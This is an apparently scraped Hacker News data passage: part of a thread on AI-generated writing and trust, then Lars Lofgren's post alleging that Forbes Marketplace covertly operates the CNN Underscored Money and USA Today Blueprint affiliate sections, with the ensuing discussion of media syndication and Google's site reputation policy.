the printing press. reply dijit 8 hours agorootparentI'm not certain what statement you're implying, but yes, accessibility of bookwriting has definitely decreased the quality of books. Even technical books like Hardcore Java: https://www.oreilly.com/library/view/hardcore-java/059600568... are god-awful, and even further away from the seminal texts on computer science that came before. It does feel like authorship was once heralded in higher esteem than it deserves today. Seems like people agree: https://www.reddit.com/r/books/comments/18cvy9e/rant_bestsel... reply fennecfoxy 4 hours agoparentprevWhy does a human being behind any words change anything at all? Trust should be based on established facts/research and not species. reply bloak 3 hours agorootparentA lot of communication isn't about \"established facts/research\"; it's about someone's experience. For example, if a human writes about their experience of using a product, perhaps a drug, or writes what they think about a book or a film, then I might be interested in reading that. When they write using their own words I get some insight into how they think and what sort of person they are. I have very little interest in reading an AI-generated text with similar \"content\". reply goatlover 2 hours agorootparentprevAn LLM isn't even a species. I prefer communicating with other humans, unless I choose to interact with an LLM. But then I know that it's a text generator and not a person, even when I ask it to act like a person. The difference matters to most humans. reply neta1337 8 hours agoparentprevWhy do you have to use it? I don’t get it. If you write your own book, you don’t compete with anyone. If anyone finished The Winds of Winter for R.R.Martin using AI, nobody would bat an eye, obviously, as we already experienced how bad a soulless story is that drifts too far away from what the author had built in his mind. reply osigurdson 5 hours agoparentprevAI expansion: take a few bullet points and have ChatGPT expand it into several pages of text AI compression: take pages of text and use ChatGPT to compress into a few bullet points We need to stop being impressed with long documents. reply fennecfoxy 4 hours agorootparentThe foundations of our education systems are based on rote memorisation so I'd probably start there. reply yusufaytas 8 hours agoparentprevI totally understand your frustration. We started writing our book long before(2022) AI became mainstream, and when we finally published it on May 2024, all we hear now is people asking if it's just AI-generated content. It’s sad to see how quickly the conversation shifts away from the human touch in writing. reply eleveriven 8 hours agorootparentI can imagine how disheartening that must be reply wengo314 8 hours agoparentprevi think the problem started when quantity became more important over quality. you could totally compete on quality merit, but nowadays the volume of output (and frequency) is what is prioritized. reply CuriouslyC 2 hours agoparentprevA lot of writers using AI use it to create outlines of a chapter or scene then flesh it out by hand. reply munksbeer 8 hours agoparentprev> but it's still depressing, to be honest. Cheer up. Things usually get better, we just don't notice it because we're so consumed with extrapolating the negatives. Humans are funny like that. reply vouaobrasil 7 hours agorootparentI actually disagree with that. People are so busy hoping things will get better, and creating little bubbles for themselves to hide away from what human beings as a whole are doing, that they don't realize things are getting worse. Technology constantly makes things worse. Cheering up is a good self-help strategy but not a good strategy if you want to contribute to making the world actually a better place. reply munksbeer 4 hours agorootparent>Technology constantly makes things worse. And it also makes things a lot better. Overall we lead better lives than people just 50 years ago, never mind centuries. reply vouaobrasil 3 hours agorootparentNo way. Life 50 years ago was better for MANY. Maybe that would be true for 200. But 50 years ago was the 70s. There were far fewer people, and the world was not starting to suffer from climate change. Tell your statement to any climate refugee, and ask them whether they'd like to live now or back then. AND, we had fewer computers and life was not so hectic. YES, some things have gotten better, but on average? It's arguable. reply vundercind 2 hours agorootparentprevIt’s fairly common for (at least) specific things to get worse and then never improve again. reply amelius 4 hours agoparentprevFunny thing is that people will also ask AI to __read__ stuff for them and summarize it. So everything an AI writes will eventually be nothing more than some kind of internal representation. reply limit499karma 6 hours agoparentprevI'll take your statement that your conclusions are based on a 'depressed mind' at face value, since it is so self-defeating and places little faith in Human abilities. Your assumption that a person driven to write will \"with a high degree of certainty\" also mix up their work with a machine assistant can only be informed by your own self-assessment (after all how could you possibly know the mindset of every creative human out there?) My optimistic and enthusiastic view of AI's role in Human development is that it will create selection pressures that will release the dormant psychological abilities of the species. Undoubtedly, wide-spread appearance of Psi abilities will be featured in this adjustment of the human super-organism to technologies of its own making. Machines can't do Psi. reply tim333 7 hours agoparentprevI'm not sure it's always that hard to tell the AI stuff from the non AI. Comments on HN and on twitter from people you follow are pretty much non AI, also people on youtube where you an see the actual human talking. On the other hand there's a lot on youtube for example that is obviously ai - weird writing and speaking style and I'll only watch those if I'm really interested in the subject matter and there aren't alternatives. Maybe people will gravitate more to the stuff like PaulG or Elon Musk on twitter or HN and less to blog style content? reply sandworm101 8 hours agoparentprev>> cannot trust anything that has been written in the past 2 years or so and up until the day that I die. You never should have. Large amounts of work, even stuff by major authors, is ghostwritten. I was talking to someone about Taylor Swift recently. They thought that she wrote all her songs. I commented that one cannot really know that, that the entertainment industry is very going at generating seemingly \"authentic\" product at a rapid pace. My colleague looked at me like I had just killed a small animal. The idea that TS was \"genuine\" was a cornerstone of their fandom, and my suggestion had attacked that love. If you love music or film, don't dig too deep. It is all a factory. That AI is now part of that factory doesn't change much for me. Maybe my opinion would change if I saw something AI-generated with even a hint of artistic relevance. I've seen cool pictures and passable prose, but nothing so far with actual meaning, nothing worthy of my time. reply davidhaymond 1 hour agorootparentWhile I do enjoy some popular genres, I'm all too aware of the massive industry behind it all. I believe that most of humanity's greatest works of art were created not for commercial interests but rather for the pure joy of creation, of human expression. This can be found in any genre if you look hard enough, but it's no accident that the music I find the most rewarding is classical music: Intellect, emotion, spirit, and narrative dreamed into existence by one person and then brought to life by other artists so we can share in its beauty. I think music brings about a connection between the composers, lyricists, performers, and listeners. Music lets us participate in something uniquely human. Replacing any of the human participants with AI greatly diminishes or eliminates its value in my eyes. reply WalterBright 6 hours agorootparentprevWatch the movie \"The Wrecking Crew\" about how a group of studio musicians in the 1970s were responsible for the albums of quite a few diverse \"bands\". Many bands had to then learn to play their own songs so they could go on tour. reply selimthegrim 6 minutes agorootparentOr the SCTV skit about Michael McDonald backing seemingly everything at one point reply nyarlathotep_ 3 hours agorootparentprev> You never should have. Large amounts of work, even stuff by major authors, is ghostwritten. I'm reminded of 'Under The Silver Lake' with this reference. Strange film, but that plotline stuck with me. reply greenie_beans 6 hours agoparentprevi know a lot of writers who don't use ai. in fact, i can't think of any writers who use it, except a few literary fiction writers. working theory: writers have taste and LLM writing style doesn't match the typical taste of a published writer. reply InDubioProRubio 7 hours agoparentprevJust dont be average and your fine. reply jshdhehe 7 hours agoparentprevAI only helps writing in so far as checking/suggesting edits. Most people can write better than AI (more engaging). AI cant tell a human story, have real tacit experience. So it is like saying my champaigne bottle cant keep up with the tap water. reply eleveriven 8 hours agoparentprevMaybe, over time, there will also be a renewed appreciation for authenticity reply paganel 9 hours agoparentprevYou kind of notice the stuff written with AI, it has a certain something that makes it detectable. Granted, stuff like the Reuters press reports might have already been written by AI, but I think that in that case it doesn’t really matter. reply williamcotton 9 hours agoparentprevWell we’re going to need some system of PKI that is tied to real identities. You can keep being anonymous if you want but I would prefer not and prefer to not interact with the anonymous, just like how I don’t want to interact with people wearing ski masks. reply flir 8 hours agorootparentI doubt that's possible. I can always lend my identity to an AI. The best you can hope for is not \"a human wrote this text\", it's \"a human vouched for this text\". reply nottorp 8 hours agorootparentprevWhy are you posting on this forum where the user's identity isn't verified by anyone then? :) But the real problem is that having the poster's identity verified is no proof that their output is not coming straight from a LLM. reply williamcotton 8 hours agorootparentI don’t really have a choice about interacting with the anonymous at this point. It certainly will affect the reputation of people that are consistently publishing untruths. reply nottorp 7 hours agorootparent> It certainly will affect the reputation of people that are consistently publishing untruths. Oh? I thought there are a lot of very well identified people making a living from publishing untruths right now on all social media. How would PKI help, when they're already making it very clear who they are? reply FrustratedMonky 2 hours agoparentprevMaybe this will push people back to reading old paper books? There could be resurgence in reading the classics, on paper, since we know they are not AI. reply wickedsight 7 hours agoparentprevWith a friend, I created a website about a race track in the past two years. I definitely used AI to speed up some of writing. One thing I used it for was a track guide, describing every corner and how to drive it. It was surprisingly accurate, most of the time. The other times though, it would drive the track backwards, completely hallucinate the instructions or link corners that are in different parts of the track. I spent a lot of time analyzing the track myself and fixed everything to the point that experienced drivers agreed with my description. If I hadn't done that, most visitors would probably still accept our guide as the truth, because they wouldn't know any better. We know that not everyone cares about whether what they put on the internet is correct and AI allows those people to create content at an unprecedented pace. I fully agree with your sentiment. reply FrankyHollywood 9 hours agoparentprevI have never read more bullshit in my life than during the corona pandemic, all written by humans. So you should never trust something you read, always question the source and it's reasoning. At the same time I use copilot on a daily basis, both for coding as well as the normal chat. It is not perfect, but I'm at a point I trust AI more than the average human. And why shouldn't I? LLMs ingest and combine more knowledge than any human can ever do. An LLM is not a human brain but it's actually performing really well. reply dustingetz 8 hours agoparentprev> If you write regularly and you're not using AI, you simply cannot keep up with the competition. You're out. What? No! Content volume only matters in stupid contests like VC app marketing grifts or political disinformation ops where the content isn’t even meant to be read, it’s an excuse for a headline. I personally write all my startup’s marketing content, quality is exquisite and due to this our brand is becoming a juggernaut reply uhtred 5 hours agoparentprevTo be honest I got sick of most new movies, TV shows, music even before AI so I will continu",
    "originSummary": [
      "The author expresses fatigue over the overuse and marketing of AI in software testing and development, noting that many AI solutions are overhyped and fail to deliver superior results.",
      "Despite acknowledging AI's useful applications, the author emphasizes that AI should be seen as a tool rather than a replacement for skilled human judgment, particularly in automated testing.",
      "The author criticizes AI-generated conference proposals for lacking unique insights and emotional depth, arguing that human-created content in music, books, and movies is irreplaceable."
    ],
    "commentSummary": [
      "The writer expresses distrust in content created in the past two years due to the prevalence of AI, feeling it lacks the human touch and authenticity.",
      "There is a debate on whether AI has significantly changed content quality or if the internet was already filled with low-quality material, with some blaming monopolistic practices by companies like Google.",
      "Opinions vary on AI's role, with some suggesting it could combat monopolies and others advocating for focusing on older, pre-AI content to ensure trust and enjoyment."
    ],
    "points": 732,
    "commentCount": 705,
    "retryCount": 0,
    "time": 1727425224
  },
  {
    "id": 41670210,
    "title": "CNN and USA Today have fake websites, I believe Forbes Marketplace runs them",
    "originLink": "https://larslofgren.com/cnn-usa-today-forbes-marketplace/",
    "originBody": "What if I told you that Forbes Marketplace, the affiliate company operating on Forbes.com ALSO had agreements with CNN and USA Today? And that Forbes Marketplace was stuffing those sites full of affiliate content just like it is with Forbes? And what if Forbes Marketplace went to extreme efforts to hide everything? I believe all this to be true. If you haven’t been following the Forbes Marketplace story, read my first post here. For the rest of this post, I’ll refer to this company as just Marketplace. Once more, down the rabbit hole we go. The Hidden Website on CNN Let’s start at the top. Go to the CNN homepage and if you scroll down a tad, you’ll find CNN Underscored: I’ve known about this for a while, thought it was a Wirecutter copycat. Turns out there’s a lot more going on. Now, if you poke around the majority of CNN Underscored, it looks like a standard affiliate site. And as far as I know, it’s run by CNN itself. EXCEPT for one section that I know about. That section is CNN Underscored Money. The first clue I found was in the staff bios. Here’s a normal CNN Underscore bio: At the very bottom, this person has a cnn.com email address. Good sign that it’s a real employee of CNN. But what if we look up a bio of someone working on the Money section of CNN Underscored? In this case, the email is under wbdcontractor.com. I assume that Warner Bro Discovery (the owner of CNN) uses this domain for all contractor emails. So this person isn’t an actual employee, they’re a contractor. Now this particular person I found is a Lead Editor, not just a freelance writer where a contract relationship would be expected. An editor has a lot of influence over the content, especially a Lead Editor. If it was me, I’d want all my editors as employees, especially for a brand like CNN. Every bio I checked under CNN Underscored Money had an email at wbdcontractor.com. Maybe I missed one but I checked a bunch. Also, all the Money “employees” are separated from the rest of the Editorial staff on the CNN Underscored About page. They’re under a separate list called “Money.” Curious. Why oh why are ALL the CNN Underscored Money folks contractors? Might it be because they’re working for a COMPLETELY different company? Hmm. We’ll see. The CNN Underscored Money Website Now let’s turn to the CNN Underscored navigation bar. Here’s the normal one: And here’s the navigation bar for the Money section of CNN Underscored: I took these screenshots with the same size browser window. And yet we see a LOT of differences. Money has a lot more categories. The “Sign In” button has slightly different styling. “More” has a little dropdown arrow in the main nav bar, it’s missing in the Money nav bar. For the affiliate disclaimer, the main nav is italicized while the Money nav is not. And the copy in the Money section is different. Why would the navigation of CNN Underscored Money be different? And why are there so many little details… off? It’s almost like someone spent a LOT of time and effort to make the nav appear identical… when they’re not. What is going on? Easy: they’re DIFFERENT FUCKING websites. Here’s the beginning of the source code for CNN Underscored: And for CNN Underscored Money: I’m not even a front-end dev and I can easily tell they’re very different. Here’s a few differences I noticed: CNN Underscored Money has Google Tag Manager installed, I can’t find it on the normal CNN Underscored. It’s highly unusual to place GTM on just one category of a website in my experience. And if it is installed, I’d expect it to be installed in the same way. For Underscored Money, a bunch of the WordPress files are in /cnn-underscored/money/wp-content/ which means there’s a separate and unique version of WordPress installed in /cnn-underscored/money/. I believe the main Underscored site is using cms.cnn.com for all its stuff. CNN Underscored has Optimizely installed, CNN Underscored Money does not. Usually tools like this will run across an entire website. I could understand CNN Underscored having its own CMS from the rest of cnn.com. That makes sense. But having ANOTHER WordPress installed for just the Money category of CNN Underscored, that makes zero sense. Unless you wanted to cordon off another company into a restricted area of your site. THAT makes sense. I believe someone installed a unique version of WordPress so they could operate the Money category independently. Who oh who could it be? My New Favorite Part of Every Website: Privacy Policies In my original post on Marketplace, the privacy policy helped me figure out what was going on. And for the rest of my career, every time I see a privacy policy, I will think to myself: “ahhh, privacy policies, the beacon of truth in a world drowning in bullshit.” Just like the rest of CNN Underscored, there’s two of everything. For the main CNN Underscored site, if you click on the privacy policy, you’ll end up here: It’s the Privacy Center for Warner Bros Discovery. Makes sense. Looks legit. Buuuuuut what about the privacy policy for CNN Underscored Money? It’s a COMPLETELY different privacy policy on its own URL: www.cnn.com/cnn-underscored/money/privacy. That’s weird as hell. And who’s Solutions Underscored LLC? I’ve got a feeling that we’re on to something. Who Is Solutions Underscored LLC? Luckily, the organization running CNN Underscored Money included the address for their company Solutions Underscored LLC in the privacy policy. It’s based in Georgia. So now we can look up the business registration of Solutions Underscored LLC. You can do this with any business. But they’re rarely indexed by Google. You have to find the business registration website for that specific state, then search there. Since I have the address, I know what state to search instead of having to check every state. If you search business registrations in Georgia, you will find one for Solutions Underscored LLC. Click around a bit and you’ll get the actual PDF of the business registration. The first page of the registration looks like this: Pretty standard stuff. If you check it yourself, I HIGHLY recommend looking at page 2: The Manager and Authorizer of Solutions Underscored is listed as Thomas Callahan. Where have I seen that name before? IT’S THE CFO OF MARKETPLACE. Or at least, someone with his exact same name. Maybe it’s a different Thomas Callahan. Or maybe it is the same guy and he has a COMPLETELY legitimate reason to be running a business that controls CNN Underscored Money. I doubt it. But it’s possible. What I Believe Is Happening with CNN Underscored Money Based on everything I’ve seen, here’s what I think happened: Marketplace wanted to expand. Running an affiliate program on Forbes wasn’t enough. They reached out to CNN and offered to run a section of their website. For some unfathomable reason, CNN agreed to a deal. What the fuck CNN? You’re CN fucking N. What in god’s name convinced you this was a good idea? And you already had a ramped up affiliate program. I say again: what the fuck CNN? Folks involved decided that CNN would install a completely unique site under cnn.com/cnn-underscored/money/ for Marketplace. Marketplace then went to absurd levels of effort to make that site look identical to the normal Underscored website. I believe this was intentional. It’s actually really easy to miss unless you’re looking for it. And there’s no way CNN didn’t realize what was going on. I believe Marketplace has since been running CNN Underscored Money with little, if any, oversight from the main CNN team. If CNN was interested in oversight, I don’t see why they’d let another company set up a completely unique website on their domain in the first place. Maybe I’m wrong. Maybe editors employed by CNN are involved in day-to-day content operations. I hope I’m wrong. Please tell me if I’m wrong. And for those of you that are curious about the success of this little endeavor, here’s the search traffic: Got hit a bit in the Aug 2024 algo update but still doing over 600K search visits/month. And way up in the past few years. Starting to rank for some real money terms too. At number 4 for me on “best mortgage lenders”: Yeah, it’s not like mortgage lenders have any real impact on people’s lives. Also number 2 for me on “best loan apps”: The Same Thing is Going on With USA Today Blueprint To me, it looks like the exact same thing is happening with USA Today Blueprint. Here’s the normal USA Today navigation bar: And the USA Today Blueprint navigation bar: Tons of little differences: Spacing is off. Font is different or has a slightly different weight. The normal USA Today nav bar has a weather widget, a sign in button, and a CTA button for the USA Today subscription. USA Today Blueprint doesn’t have any of that stuff. USA Today Blueprint doesn’t have as many ads but I could understand that, I’d fight to remove display ads in any affiliate program. Even a legit one. The sites look very different once you get under the hood too. Again, someone put in some real effort to make these sites look identical when they’re not. But time for the smoking gun. A few days ago, I grabbed this screenshot of a USA Blueprint bio: In the bottom left, you’ll see the mouse-over for the email address tied to the email icon. To make this easier, let’s ENHANCE: The domain is marketplace.co. Yes, THAT marketplace.co. The same website for the company that runs the affiliate program on Forbes: An Editor at USA Today Blueprint has an email address on the same domain as Marketplace. I’m going to assume that’s because the editor is an employee at Marketplace and NOT an employee of USA Today. By the way, I just tried to get a better screenshot of that email address. Now the bios look like this: Seems like the team is scrubbing info since my original post went viral. Feels like a rush job too. I wonder why? The funny part: that marketplace.co email address is still listed on that email icon: They missed scrubbing the best part! As for the search traffic on USA Today Blueprint: Took a sizable hit during the March 2024 algo update. Still doing over 800K search visits/month though. Before we wrap for USA Today Blueprint, I’d like to point out a link added to the bottom of the About page for USA Today Blueprint: See that link for Ethical Conduct For Newsrooms? It goes to the ethical conduct page used by all of USA Today. On that page, there’s a section on maintaining independence. What a load of horse shit. Meet the Author Lars Lofgren Lars is the Chief Growth Officer and Co-founder of Stone Press. Before that, he managed multiple departments across several startups.",
    "commentLink": "https://news.ycombinator.com/item?id=41670210",
    "commentBody": "CNN and USA Today have fake websites, I believe Forbes Marketplace runs them (larslofgren.com)479 points by greg_V 5 hours agohidepastfavorite185 comments gjadi 4 hours agoAlso posted a week ago: https://news.ycombinator.com/item?id=41590466 In case you're interested in what was discussed before on this topic. dang 1 hour agoparentThanks! Macroexpanded: Forbes Marketplace: The Parasite SEO Company Trying to Devour Its Host - https://news.ycombinator.com/item?id=41590466 - Sept 2024 (297 comments) reply shipscode 4 hours agoprevLet me break down how the media industry works nowadays since there’s a lot of confusion in these comments. Most media organizations have a small number of in-house journalists on verticals that make sense. The rest of the content is curated and brought in from content partners and written outside of the news organization. In practice they function more like a social media feed than traditional newspapers. I’m no fan of CNN, but this isn’t exactly a scandal, media had to adapt to keep up with so much being on social media these days, they all do this. reply beejiu 2 hours agoparentThe context is that Google has a new \"Site reputation abuse\" policy that some argue isn't applied fairly between small sites and massive media sites. The policy states: \"Site reputation abuse is when third-party pages are published with little or no first-party oversight or involvement, where the purpose is to manipulate search rankings by taking advantage of the first-party site's ranking signals. Such third-party pages include sponsored, advertising, partner, or other third-party pages that are typically independent of a host site's main purpose or produced without close oversight or involvement of the host site.\" https://developers.google.com/search/docs/essentials/spam-po... That's why it's all hush-hush within the industry. reply kube-system 1 hour agorootparent> That's why it's all hush-hush within the industry. I think a much more simple answer is that syndication has always been hush-hush because branding and brand trust is a key part of media marketing. Your local newspaper in the 90s had a ton of syndicated stories too but it was all published under your local paper's hometown moniker. reply refulgentis 44 minutes agorootparentI wonder about the relationship between those two, column attribution in 90s newspapers doesn't have much to say about the incentive to stay quiet to avoid publicly announcing you're violating Google's rules in 2024. That aside, I'm not sure the assertion about 90s papers is accurate. There was syndication, of course, but that was attributed. Let's say there were articles written by other people published under the names of local writers. That sounds theoretically possible, but something that'd be well known. Let's say there were articles attributed to the paper at large. I don't recall that. reply kube-system 30 minutes agorootparentSyndicated material was disguised all the time. Ask most people and they think that most of the stories in their local newspaper are written by people that work there. > The average American reader didn’t necessarily notice the way syndicates and chains had come to dominate the news. Syndicates were careful to sell their material to only one newspaper per city. While syndicated features usually carried a small copyright symbol, the name that followed that symbol could be deliberately opaque. Readers wouldn’t automatically know that “King Features” denoted Hearst material, or that “NEA” indicated content from the Scripps chain. Local papers sometimes purposely disguised syndicated material. The Milwaukee Sentinel bought a comic strip from the New York World syndicate in 1918, for example, but retitled it “Somewhere in Milwaukee.” The same paper told readers to send in their letters for Dorothy Dix as though she could be reached in Milwaukee, and not in New York City, where she lived and sold her work to the Ledger syndicate. https://www.smithsonianmag.com/history/how-syndicated-column... Local newspapers didn't want to plainly advertise that a gigantic chunk of their content came from thousands of miles away. It undermines their value proposition. Likewise, CNN probably likes that a huge chunk of featured content on their page is driving them revenue but doesn't look like a big ad to their audience. reply WD-42 4 hours agoparentprevIn the authors previous post he goes into Forbes marketplace which is the same company doing this garbage content farm for CNN that they have already been doing for Forbes. The content farm company is now trying to buy the original Forbes company. So when our media companies become small subsidiaries of affiliate content farms then yea I think it’s a bit disturbing. reply weard_beard 3 hours agorootparentnext [6 more] The news is the news: it isn't news that the news isn't news anymore. reply toss1 3 hours agorootparentAu contraire, the fact that news is no longer news is the biggest news there is. Sure, the mere fact that the news is no longer news, is old news. But how and why it is happening is big and un-reported news. When six companies control 90% of the news outlets, that is unprecedented concentration and loss of the diverse viewpoints necessary for a robust society. When those corporations which normally sell-off any lossmaking division instead hold loss-making 'news' divisions in a now-chronically lossmaking industry, the payoff is not some potential future profits; the payoff is in influencing public opinion to favor policies advantageous to your larger corporation. So, of course the how and why it is happening is unreported by the organizations that are making it happen. reply janalsncm 1 hour agorootparent> loss of the diverse viewpoints necessary for a robust society This isn’t wrong but let me put a finer point on it: when BigCompany Inc starts dumping sludge into your town’s lake, you need independent journalists to figure that out. Corporate talking heads aren’t going to do that. And certainly not the people running a link farm. What news is reported is as important as whether the facts are true. The easiest path to propaganda is to simply report other, more convenient, facts. reply coliveira 1 hour agorootparentprevThe news industry was always a low profit business even in the best times, so one should ask why it is so interesting for powerful people. The answer is the same in the past as it is today, it just takes a little of critical thinking to understand. reply WillPostForFood 1 hour agorootparentprevGood old days? https://todayinhistory.blog/wp-content/uploads/2021/02/ea30f... https://pbs.twimg.com/media/GGLtwVmWwAAia-Y?format=jpg&name=... reply datavirtue 1 hour agorootparentprevYeah, a lot of people pay for deeper content. I basically hang out on yahoo finance all day (crazy awesome site), and they make a lot of news feeds available to their subscribers. But it takes quite a big commitment to subscribe at a level where you get all the news and analyst reports in a timely fashion. Google News feeds have been declining in quality and don't find them valuable anymore. Hacker News is one of the sites I scan for news. I check it all, and I belong to Ground News as well. reply magic-michael 3 hours agorootparentprevCan you show me where the garbage content is? They seem to all have experts that have written in these areas for decades. reply alwa 1 hour agorootparentWell… that’s the crux of the discomfort. These brands’ newsrooms do in fact have those people. That’s the reason their names inspire trust. Now, they’ve decided to cash out that trust by lending their names to sleazy content farming affiliate marketer types. For now, that’s valuable, since people (and Google) trust the names based on what they used to do—and they distrust the rest of the endless chorus of hucksters. But sooner or later, the world realizes there’s no longer good reason to trust those names. They’re just snake oil (and CBD gummy) salesmen like the rest. And then we’re left without popular institutions that are trustworthy when we need to understand complicated and true things about the world. And we’ve punished people (and Google) for even trying to place more weight on honest reportage and institutional signals of expertise. reply itishappy 2 hours agorootparentprevTop google result for \"best pet insurance\" and \"best CBD gummies\" are Forbes (actually Forbes Marketplace), and they've moving into sports betting. https://larslofgren.com/forbes-marketplace/ reply magic-michael 1 hour agorootparentThat's what I mean, he doesn't look at the content itself reply hedora 4 hours agoparentprevThere are still counterexamples: https://www.propublica.org/ Traditional newspapers would get stories from things like AP, and then the editors would decide what to run. They’d also have reporters that wrote local stories, etc. I’d argue that any news site that has eliminated all those roles is already out of business and is simply burning down their brand at this point. reply ArnoVW 3 hours agorootparentAs Obama famously quipped during his last Whitehouse Correspondent dinner: Even reporters have left me. Savannah Guthrie, she has left the White House press corps to host the Today show. Norah O’Donnell left the briefing room to host CBS This Morning. Jake Tapper left journalism to join CNN. reply ghaff 3 hours agorootparentprevMany publications have long relied on outside contributors with various degrees of transparency and conflicts of interest. When blogging was the hotness, as an analyst, I contributed to CNET (unpaid; they paid some bloggers but I didn't want that conflict of interest). After CBS bought them and the whole blog climate changed (and I moved to a vendor), I stopped doing that. But a ton of that sort of thing went on in the tech trade press--some good and some almost certainly not so good. reply dialup_sounds 2 hours agorootparentprevThese aren't news sections that are being outsourced, they're things like \"The 9 best leggings on Amazon, according to fitness experts¹\" and \"Best pet insurance companies of September 2024²\". ¹ https://www.cnn.com/cnn-underscored/fashion/best-leggings-on... ² https://www.usatoday.com/money/blueprint/pet-insurance/best-..., https://www.cnn.com/cnn-underscored/money/best-pet-insurance reply kube-system 56 minutes agorootparentThese sort of pay-to-play review marketing didn't originate on the internet. These are copies of arrangements that print media invented. My hometown newspaper had this kind of stuff too. reply pishpash 2 hours agorootparentprevNews sections are outsourced to AP's essaybots. reply input_sh 3 hours agorootparentprevThe key difference is that ProPublica is a non-profit. There are very few non-profit investigative journalism orgs in the world, but their funding is fundamentally different than for-profit news orgs. They rely on public grants to keep things running, so therefore, they don't have to abuse their brand in similar ways. That's also why they publish only a couple of stories per day instead of hundreds, why they never cover breaking news, why there's a donate button (as opposed to now-standard paywalls), why there's no ads, why the interface appears cleaner etc. If we were talking about tech companies, it'd be like comparing Wikimedia/Mozilla/Internet Archive to traditional for-profit tech companies. To an untrained eye there is no difference, but a somewhat trained eye quickly realises that their incentives are completely different. (Disclaimer: I work for a different non-profit investigative journalism organization.) reply coliveira 1 hour agorootparentThey are funded by NGOs controlled by billionaires, so in the end there is a number of things they cannot investigate if they want to maintain the NGO money. reply input_sh 55 minutes agorootparentThat's not how grants work, they don't come with a \"you can't report on us specifically\" clause. reply KoolKat23 1 hour agoparentprevYes, and to add there's nothing wrong with it. The editor is responsible for curation. This has been a practice for many decades, there are news agencies primarily focused on selling syndicated content produced by their own journalists such as Associated Press or Reuters. You'll find this content in all newspapers even the best. Generally unless it's an exclusive or breaking news, there's a good chance it'll be syndicated at some point. reply dawnerd 3 hours agoparentprevIsn’t even new. Demand Media was doing this 10+ years ago and sites like USA Today were buying content. These days you have companies creating their own sponsored content with platforms like Ceros and the sites just embedding it and cashing the checks. Of course the sites do the bare minimum legally required to disclose its sponsored content. reply tiffanyh 41 minutes agoparentprevIsn't this literally the business model of AP News (Associated Press)? https://apnews.com They sell stories to other news outlets to publish on their own website. reply thekevan 2 hours agoparentprevI disagree that it does not venture into scandal territory due to the fact that CNN is a news organization that is constantly defending their integrity. They are presenting content as their own under questionable sources that they don't reveal. It proves they are being less genuine when doing so makes them money. reply badlibrarian 4 hours agoparentprevThe contract reporters are also personally liable for what they submit. So there is absolutely zero incentive to risk going deep on a topic, let alone investigate anything. reply JumpCrisscross 4 hours agoparentprev> Let me break down how the media industry works nowadays How free* media works. The media landscape has sadly divided into assuming only those who can pay for news want to be informed or have their views challenged. The poor get ads and echo chambers. reply dialup_sounds 2 hours agorootparentLots of people pay for The New York Times and they still operate their affiliate link site Wirecutter. reply fhdsgbbcaA 3 hours agorootparentprevEven prestige publications like The New Yorker use freelancers. This is the same thing, it’s just lower brow content. reply ryandamm 3 hours agorootparentThat’s not a fair comparison, The New Yorker has always had a different relationship with its writers. A freelancer who writes for The New Yorker is likely a highly respected journalist/author/other luminary. Their staff writers are, I believe, technically contractors as they’re not W2 employees. Contractor-written slop at these content farms, as described by TFA, have nothing in common with how content works at The New Yorker. reply Spivak 3 hours agorootparentprevWho is the mythical non-echo-chamber informative challenging news source? reply carlosjobim 55 minutes agorootparentThey wrote that these things can be found in paid sources. reply janalsncm 1 hour agorootparentprevpropublica.org is pretty good. reply alexandre_m 3 hours agorootparentprevThat would be an aggregator, like allsides.com reply tensor 2 hours agorootparentI think \"non-echo chamber content\" is only valuable as long as all of it is similarly high quality. In my opinion, reading diverse but low quality content (e.g. filled with misinformation, a lack of concrete information, and a lack of sensible reasoning) is not helpful. reply dingnuts 3 hours agorootparentprevI had a subscription to the Wall Street Journal for awhile and while I can't say that's what the GP is referring to, it absolutely sounds like the kind of deluded crap a WSJ subscriber would say to justify spending $40/mo on that crap to themselves :D reply tolerance 4 hours agoparentprevWhat you’ve described does indeed sound scandalous irrespective of its scope. reply hn_throwaway_99 3 hours agoparentprevYeah, I read this blog post and thought throughout the whole thing, \"Is this person just completely unaware of how the media and branding industries work?\" He tries to make it out to be some great \"scandal\" when literally tons and tons of media brands outsource sections of their website. Now, to be clear, I'm not exactly excusing CNN for this, but literally for years now I've rolled my eyes at the extremely spammy/low quality/clickbait ads that have appeared on CNN articles online. The fact that they've outsourced part of their \"Underscored\" site, which isn't exactly journalism to begin with, is not something I care about. And in case you missed it, journalism has had a blood bath over the past 25 years. While I think what CNN is doing in terms of affiliate ads is scammy, can I really blame them? Hardly anyone wants to pay for journalism these days, but journalists still want to eat. At least with these clickbait ads I find them so low quality that they don't confuse me into being \"real\" articles. reply ddtaylor 2 hours agoparentprevThis doesn't make it acceptable. We can want better. reply fhdsgbbcaA 3 hours agoparentprevI’m super confused as to why this is worth a blog post, let alone the conspiratorial tone. This seems to be a case of knowledge without context being a dangerous thing in the wrong hands. reply reaperducer 3 hours agoparentprevLet me break down how the media industry works It looks like you mean: \"Let me break down how a certain portion of the media industry that I'm familiar with works.\" \"The media industry\" is vast, complex, diverse, and far more interesting than internet content farms, poorly-run legacy brands, or even most of what's on the internet. reply fhdsgbbcaA 3 hours agorootparentFreelancers have existed since the dawn of journalism. reply yamazakiwi 3 hours agorootparentprev\"interesting\" isn't the word I would have chosen reply anigbrowl 2 hours agoparentprev'They all do this' isn't a good excuse when 'this' is deceiving the consumer. I am so sick of marketing/branding people faking everything, and wish they could all be shipped off Golgafrincham. reply ClownsAbound 2 hours agoparentprevYou’re omitting how much influence / censorship our government have over these institutions now, and how much they apply pressure to prevent dissenting voices and opinions from reaching the main stream. reply FactKnower69 1 hour agorootparentThe passive voice shit from the past couple years has gotten truly audacious and increasingly infuriating reply corysama 4 hours agoprevI’ve heard that a while back Google had a change to their algo that heavily prioritized widely used websites as “trusted”. The very most well known sites in the world, such as cnn.com, would be treated as the best results for anything they contained. In response, many of the most used web sites flooded their own sites with transparently fake product reviews full of SEO phrases about “we spent N weeks testing K products to root out the very best” and very little else. The actual reviews would be pretty much copy-pasted from the description provided on the product producer’s site. And, that’s how Google made itself useless for finding product reviews. reply palmfacehn 3 hours agoparentThe above poster speaks to the crux of the issue. CNN, Forbes and other sites are doing things that a normal webmaster could be nuked from orbit for, after a \"manual review\". Yet, these are the manually curated sites which Google claims have high trust signals. There are a few disparate incentives. One is a political desire to buttress the \"official truths\" of the legacy media. The other is a market incentive for the dying legacy media sites to earn revenue. There is a third, related market incentive for the dissatisfied media consumers. CNN isn't as compelling as it was two decades ago. Eyeballs and ears are naturally straying towards the perceived value of alternative media sources. Therefore, to continue the ancien regime, it becomes necessary for Google to prop up CNN and others. There is a possible world where Google creates value by indexing 